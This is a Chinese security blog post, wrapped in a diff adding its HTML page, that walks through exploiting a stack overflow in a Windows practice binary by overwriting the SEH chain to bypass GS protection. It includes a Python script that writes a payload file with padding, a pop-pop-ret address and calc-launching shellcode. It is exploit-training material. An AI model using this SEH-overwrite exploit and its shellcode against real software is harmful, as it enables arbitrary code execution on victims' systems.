@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="https://niwbie.github.io">
+  <title>PWN练习（绕过GS保护） | isee&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="程序：test">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN练习（绕过GS保护）">
+<meta property="og:url" content="https://niwbie.github.io/2016/09/16/PWN练习(绕过GS保护)/index.html">
+<meta property="og:site_name" content="isee'blog">
+<meta property="og:description" content="程序：test">
+<meta property="og:image" content="https://niwbie.github.io/image/PWN练习_绕过GS保护/1.png">
+<meta property="og:updated_time" content="2017-11-12T08:34:50.138Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PWN练习（绕过GS保护）">
+<meta name="twitter:description" content="程序：test">
+<meta name="twitter:image" content="https://niwbie.github.io/image/PWN练习_绕过GS保护/1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="isee&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/image/favicon.ico">
+  
+  <link rel="stylesheet" href="/main.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+      <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img src="/image/favicon.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">isee</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">从未放弃治疗</p>
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+				<li><a href="/">相册</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+	        
+    		
+    			
+    			<a class="js-smart-menu" data-idx="0" href="javascript:void(0)">所有文章</a>
+    			
+    			
+            
+    			
+    			<a class="js-smart-menu" data-idx="1" href="javascript:void(0)">标签</a>
+    			
+    			
+            
+    			
+    			<a class="js-smart-menu" data-idx="2" href="javascript:void(0)">友链</a>
+    			
+    			
+            
+    			
+    			<a class="js-smart-menu" data-idx="3" href="javascript:void(0)">关于我</a>
+    			
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="rss" target="_blank" href="#" title="rss">rss</a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"><i class="icon-list"></i></div>
+  		<h1 class="header-author js-mobile-header hide">isee</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				
+					<img src="/image/favicon.jpg" class="js-avatar">
+				
+			</div>
+			<hgroup>
+			  <h1 class="header-author">isee</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">从未放弃治疗</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/">相册</a></li>
+		        
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="rss" target="_blank" href="#" title="rss">rss</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap">
+        <article id="post-PWN练习(绕过GS保护)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PWN练习（绕过GS保护）
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>程序：<a href="/image/PWN练习_绕过GS保护/test_x86_wo_safeseh_dep.exe">test</a><br><a id="more"></a></p>
+<p><img src="/image/PWN练习_绕过GS保护/1.png" alt="这里写图片描述"><br>漏洞很简单，就是逐字节读取文件，但是没有限制长度，导致栈溢出。<br>不过开启了GS保护（类似canary），所以如果直接用栈溢出覆盖返回地址，则会出错。所以这里利用SEH来绕过GS保护。</p>
+<p><a href="/2016/03/29/在栈中利用SEH/index.html">原理在这</a></p>
+<p>直接上python写文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">jmp_addr = &apos;\xeb\x06\x90\x90&apos;</div><div class="line">ppr_addr = &apos;\x31\x19\x0f\x01&apos;</div><div class="line"></div><div class="line">shellcode=[0xeb,0x67,0x55,0x8b,0xec,0x64,0xa1,0x30,0x0,0x0,0x0,0x8b,0x40,0xc,0x8b,0x40,0x14,0x8b,0x0,0x8b,0x70,0x28,0x80,0x7e,0xc,0x33,0x75,0xf5,0x8b,0x40,0x10,0x8b,0xf8,0x3,0x7f,0x3c,0x8b,0x7f,0x78,0x3,0xf8,0x8b,0xdf,0x8b,0x7b,0x20,0x3,0xf8,0x33,0xc9,0x8b,0x34,0x8f,0x3,0xf0,0x41,0x8b,0x54,0x24,0x8,0x39,0x16,0x75,0xf2,0x8b,0x54,0x24,0xc,0x39,0x56,0x4,0x75,0xe9,0x8b,0x7b,0x24,0x3,0xf8,0x8b,0xc,0x4f,0x81,0xe1,0xff,0xff,0x0,0x0,0x8b,0x7b,0x1c,0x3,0xf8,0x49,0xc1,0xe1,0x2,0x8b,0x3c,0xf,0x3,0xc7,0x5d,0xc2,0x8,0x0,0x68,0x78,0x65,0x63,0x0,0x68,0x57,0x69,0x6e,0x45,0xe8,0x8a,0xff,0xff,0xff,0x50,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0xe8,0x7a,0xff,0xff,0xff,0x50,0x6a,0x0,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x6a,0x5,0x8d,0x4c,0x24,0x4,0x51,0x8b,0x44,0x24,0x18,0xff,0xd0,0x83,0xc4,0xc,0x33,0xc0,0x50,0x8b,0x44,0x24,0x4,0xff,0xd0]</div><div class="line"></div><div class="line">fr = open(&apos;msg.dat&apos;,&apos;wb+&apos;)</div><div class="line"></div><div class="line">payload = &apos;A&apos;*84 + jmp_addr + ppr_addr</div><div class="line">fr.write(payload)</div><div class="line">for s in range(len(shellcode)):</div><div class="line">	fr.write(chr(shellcode[s]))</div><div class="line">over = &apos;c&apos;*(20000-len(payload))</div><div class="line">fr.write(over)</div></pre></td></tr></table></figure>
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/09/16/PWN练习(绕过GS保护)/" class="archive-article-date">
+  	<time datetime="2016-09-16T13:28:12.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-09-16</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2016/10/20/爆破一个多线程E语言程序/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          爆破一个多线程E语言程序
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/08/09/一道unlink的pwn练习/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">一道unlink的pwn练习</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+	    <a class="jiathis_button_twitter"></a>
+	    <a class="jiathis_button_plus"></a> 
+	    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="//v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="PWN练习(绕过GS保护)" data-title="PWN练习（绕过GS保护）" data-url="https://niwbie.github.io/2016/09/16/PWN练习(绕过GS保护)/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"isee233"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2017 isee
+    	</div>
+        <span id="busuanzi_container_site_pv">
+             <i class="fa fa-flag"></i>    你是第<span id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></span>个到访的小伙伴
+        </span>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false,
+		root: "/",
+		innerArchive: true
+	}
+</script>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e437fc8d2c87edc2105c789a41592718";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script src="/./main.js"></script>
+
+
+    
+<div class="tools-col">
+  <ul class="btn-wrap">
+    
+      <li class="chose" data-hook="tools-section-all"><span class="text">全部</span><i class="icon-book"></i></li>
+    
+    
+      <li data-hook="tools-section-tag"><span class="text">标签</span><i class="icon-price-tags"></i></li>
+    
+    
+      <li data-hook="tools-section-friends"><span class="text">友链</span><i class="icon-link"></i></li>
+    
+    
+      <li data-hook="tools-section-me"><span class="text">我</span><i class="icon-smile"></i></li>
+    
+  </ul>
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all chose">
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-tag">
+    			<div class="widget tagcloud" id="js-tagcloud">
+    				<a href="/tags/C/" style="font-size: 18.57px;">C</a> <a href="/tags/CrackMe/" style="font-size: 14.29px;">CrackMe</a> <a href="/tags/Hexo/" style="font-size: 11.43px;">Hexo</a> <a href="/tags/Linux/" style="font-size: 17.14px;">Linux</a> <a href="/tags/Windows/" style="font-size: 12.86px;">Windows</a> <a href="/tags/ctf/" style="font-size: 15.71px;">ctf</a> <a href="/tags/漏洞挖掘/" style="font-size: 18.57px;">漏洞挖掘</a> <a href="/tags/神经网络/" style="font-size: 10px;">神经网络</a> <a href="/tags/逆向/" style="font-size: 20px;">逆向</a>
+    			</div>
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-friends">
+  		
+  			<div class="friends-wrap" id="js-friends">
+  			
+  	          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.youngroe.com/">Lyon&#39;s blog</a>
+  	        
+  	          <a target="_blank" class="main-nav-link switch-friends-link" href="https://amywushu.github.io/">Amywushu</a>
+  	        
+  	          <a target="_blank" class="main-nav-link switch-friends-link" href="http://biubiubiu.info/">biubiubiu</a>
+  	        
+  	          <a target="_blank" class="main-nav-link switch-friends-link" href="https://cookiezh.github.io/">cookiezh</a>
+  	        
+  	        </div>
+  		
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-me">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">汪！</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+</body>
+</html>
